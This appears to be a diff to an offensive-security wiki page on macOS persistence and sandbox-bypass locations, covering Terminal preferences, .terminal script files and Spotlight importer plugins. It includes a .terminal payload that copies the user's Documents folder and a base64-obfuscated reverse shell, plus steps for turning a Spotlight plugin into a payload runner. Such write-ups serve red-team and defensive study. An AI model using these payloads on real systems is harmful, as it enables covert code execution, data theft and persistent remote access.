@@ -175,7 +175,16 @@ To **add an application to this list** you can use:
     ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
 
-### Terminal
+### Terminal Preferences
+
+* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+
+#### Location
+
+* **`~/Library/Preferences/com.apple.Terminal.plist`**
+  * **Trigger**: Open Terminal
+
+#### Description & Exploitation
 
 In **`~/Library/Preferences`** are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.
 
@@ -215,6 +224,53 @@ You can add this from the cli with:
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
 ```
 {% endcode %}
+
+### Terminal Scripts
+
+* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+
+#### Location
+
+* **Anywhere**
+  * **Trigger**: Open Terminal
+
+#### Description & Exploitation
+
+If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.
+
+Try it with:
+
+```bash
+# Prepare the payload
+cat > /tmp/test.terminal << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CommandString</key>
+	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+	<key>ProfileCurrentVersion</key>
+	<real>2.0600000000000001</real>
+	<key>RunCommandAsShell</key>
+	<false/>
+	<key>name</key>
+	<string>exploit</string>
+	<key>type</key>
+	<string>Window Settings</string>
+</dict>
+</plist>
+EOF
+
+# Trigger it
+open /tmp/test.terminal
+
+# Use something like the following for a reverse shell:
+<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
+```
+
+{% hint style="danger" %}
+If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).
+{% endhint %}
 
 ### Audio Plugins
 
@@ -1006,6 +1062,95 @@ void custom(int argc, const char **argv) {
 
 @end
 ```
+
+### Spotlight Plugins
+
+Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+
+* But you will end in an application sandbox
+
+#### Location
+
+* `~/Library/Spotlight/`
+  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
+* `/Library/Spotlight/`
+  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
+  * Root required
+* `/System/Library/Spotlight/`
+  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
+  * Root required
+* `Some.app/Contents/Library/Spotlight/`
+  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
+  * New app required
+
+#### Description & Exploitation
+
+Spotlight is macOS's built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\
+To facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing most files**, enabling swift searches through both file names and their content.
+
+The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.
+
+The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.
+
+It's possible to **find all the `mdimporters`** loaded running:
+
+```bash
+mdimport -L
+Paths: id(501) (
+    "/System/Library/Spotlight/iWork.mdimporter",
+    "/System/Library/Spotlight/iPhoto.mdimporter",
+    "/System/Library/Spotlight/PDF.mdimporter",
+    [...]
+```
+
+And for example **/Library/Spotlight/iBooksAuthor.mdimporter** is used to parse these type of files (extensions `.iba` and `.book` among others):
+
+```json
+plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
+
+[...]
+"CFBundleDocumentTypes" => [
+    0 => {
+      "CFBundleTypeName" => "iBooks Author Book"
+      "CFBundleTypeRole" => "MDImporter"
+      "LSItemContentTypes" => [
+        0 => "com.apple.ibooksauthor.book"
+        1 => "com.apple.ibooksauthor.pkgbook"
+        2 => "com.apple.ibooksauthor.template"
+        3 => "com.apple.ibooksauthor.pkgtemplate"
+      ]
+      "LSTypeIsPackage" => 0
+    }
+  ]
+[...]
+ => {
+      "UTTypeConformsTo" => [
+        0 => "public.data"
+        1 => "public.composite-content"
+      ]
+      "UTTypeDescription" => "iBooks Author Book"
+      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
+      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
+      "UTTypeTagSpecification" => {
+        "public.filename-extension" => [
+          0 => "iba"
+          1 => "book"
+        ]
+      }
+    }
+[...]
+```
+
+{% hint style="danger" %}
+If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**. Thats because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) and it doesn't need to specify extensions.
+
+Moreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own `mdimporters`.
+{% endhint %}
+
+To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
+Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.
+
+Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**
 
 ### ~~Preference Pane~~
 
